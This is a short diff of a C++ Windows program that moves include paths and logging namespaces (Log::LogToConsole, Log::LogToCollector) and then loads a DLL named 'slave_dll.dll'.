@@ -1,14 +1,14 @@
 #include <windows.h>
-#include <Innocence.hpp>
-#include <common/Log.hpp>
+#include <common/Innocence.hpp>
+#include <log/Log.hpp>
 
 int main()
 {
 	try
 	{
-		LOG.setIdentity(Innocence::identity);
-		LOG.addObserver(new Common::LogToConsole);
-		LOG.addObserver(new Common::LogToCollector);
+		LOG.setIdentity(Common::identity);
+		LOG.addObserver(new Log::LogToConsole);
+		LOG.addObserver(new Log::LogToCollector);
 
 		// Chargement normal de la DLL
 		HMODULE hModule = LoadLibrary("slave_dll.dll");
